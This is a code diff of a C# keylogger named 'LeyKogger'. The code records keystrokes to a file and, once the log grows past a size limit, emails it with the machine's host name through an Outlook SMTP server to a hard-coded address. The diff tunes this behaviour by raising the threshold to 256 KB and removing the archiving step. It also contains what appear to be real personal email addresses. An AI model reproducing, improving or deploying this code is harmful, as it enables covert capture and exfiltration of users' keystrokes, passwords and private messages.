@@ -23,9 +23,7 @@ namespace LeyKogger
         private static void Initiate()
         {
             if (!File.Exists(path))
-                File.Create(path);
-            if (!File.Exists(path + ".archive"))
-                File.Create(path + ".archive");
+                _ = File.Create(path);
         }
 
         private static void ReadKeyboard()
@@ -46,11 +44,6 @@ namespace LeyKogger
             {
                 return false;
             }
-        }
-
-        private static async Task<string> ReadText()
-        {
-            return await File.ReadAllTextAsync(path);            
         }
 
         private static async Task WriteText()
@@ -92,12 +85,9 @@ namespace LeyKogger
                     {
                         buffer = "";
                         keys.Clear();
-                        if (await BytesCount() > 1 * 1024) //256KB
+                        if (await BytesCount() > 256 * 1024) //256KB
                         {
                             await SendMailAsync();
-                            if (File.Exists(path + ".archive"))
-                                File.SetAttributes(path + ".archive", FileAttributes.Normal);
-                            await File.AppendAllTextAsync(path + ".archive", path);
                             File.SetAttributes(path, FileAttributes.Normal);
                             await File.WriteAllTextAsync(path, buffer);
                         }
@@ -111,8 +101,10 @@ namespace LeyKogger
             if (File.Exists(path + ".att"))
                 File.SetAttributes(path + ".att", FileAttributes.Normal);
             File.Copy(path, path + ".att", true);
-            MailMessage message = new MailMessage("leykogger@outlook.com", "mbarycki@uni.opole.pl");
-            message.Subject = "Key log " + DateTime.Now.ToString() + " " + Dns.GetHostName();
+            MailMessage message = new("leykogger@outlook.com", "mbarycki@uni.opole.pl")
+            {
+                Subject = "Key log " + DateTime.Now.ToString() + " " + Dns.GetHostName()
+            };
             message.Attachments.Add(new Attachment(path + ".att"));
             using (SmtpClient client = new SmtpClient("smtp-mail.outlook.com"))
             {
